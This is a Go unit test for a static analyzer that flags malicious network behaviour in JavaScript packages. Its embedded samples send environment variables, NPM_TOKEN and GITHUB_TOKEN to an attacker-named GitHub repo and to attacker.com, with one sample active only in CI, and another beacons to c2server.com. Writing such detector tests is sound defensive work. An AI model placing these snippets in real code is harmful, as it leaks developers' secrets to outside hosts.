package scanner

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestStaticNetworkAnalyzer(t *testing.T) {
	tmpDir, err := os.MkdirTemp("", "network-test")
	require.NoError(t, err)
	defer os.RemoveAll(tmpDir)

	analyzer := NewStaticNetworkAnalyzer(tmpDir)

	t.Run("Exfiltration Detection - GitHub API", func(t *testing.T) {
		maliciousFile := `
const fetch = require('node-fetch');

async function exfilData() {
  const data = {
    env: process.env,
    secrets: process.env.NPM_TOKEN
  };
  
  await fetch('https://api.github.com/repos/attacker/exfil/issues', {
    method: 'POST',
    body: JSON.stringify(data)
  });
}

exfilData();
`
		filePath := filepath.Join(tmpDir, "exfil.js")
		require.NoError(t, os.WriteFile(filePath, []byte(maliciousFile), 0644))

		threats, err := analyzer.AnalyzeProject([]string{filePath})
		require.NoError(t, err)

		// Should detect exfiltration
		assert.GreaterOrEqual(t, len(threats), 1, "Should detect GitHub API exfiltration")
		assert.Equal(t, "runtime_exfiltration", string(threats[0].Type))
	})

	t.Run("Environment-Aware Malware", func(t *testing.T) {
		ciAwareFile := `
// Only activate in CI environments
if (process.env.CI && process.env.GITHUB_ACTIONS) {
  const secrets = {
    token: process.env.GITHUB_TOKEN,
    npm: process.env.NPM_TOKEN
  };
  
  // Exfiltrate
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(secrets)
  });
}
`
		filePath := filepath.Join(tmpDir, "ci-aware.js")
		require.NoError(t, os.WriteFile(filePath, []byte(ciAwareFile), 0644))

		threats, err := analyzer.AnalyzeProject([]string{filePath})
		require.NoError(t, err)

		// Should detect environment awareness
		found := false
		for _, threat := range threats {
			if threat.Type == "environment_aware" {
				found = true
				break
			}
		}
		assert.True(t, found, "Should detect CI-aware behavior")
	})

	t.Run("Beacon Activity Detection", func(t *testing.T) {
		beaconFile := `
const axios = require('axios');

// Beacon every 60 seconds
setInterval(() => {
  axios.get('https://c2server.com/beacon');
}, 60000);
`
		filePath := filepath.Join(tmpDir, "beacon.js")
		require.NoError(t, os.WriteFile(filePath, []byte(beaconFile), 0644))

		threats, err := analyzer.AnalyzeProject([]string{filePath})
		require.NoError(t, err)

		// Should detect beacon
		found := false
		for _, threat := range threats {
			if threat.Type == "beacon_activity" {
				found = true
				break
			}
		}
		assert.True(t, found, "Should detect beacon pattern")
	})

	t.Run("Clean Code - No False Positives", func(t *testing.T) {
		cleanFile := `
// Legitimate package with no network calls
module.exports = function sum(a, b) {
  return a + b;
};
`
		filePath := filepath.Join(tmpDir, "clean.js")
		require.NoError(t, os.WriteFile(filePath, []byte(cleanFile), 0644))

		threats, err := analyzer.AnalyzeProject([]string{filePath})
		require.NoError(t, err)

		// Should not detect any threats
		assert.Equal(t, 0, len(threats), "Clean code should have no threats")
	})
}
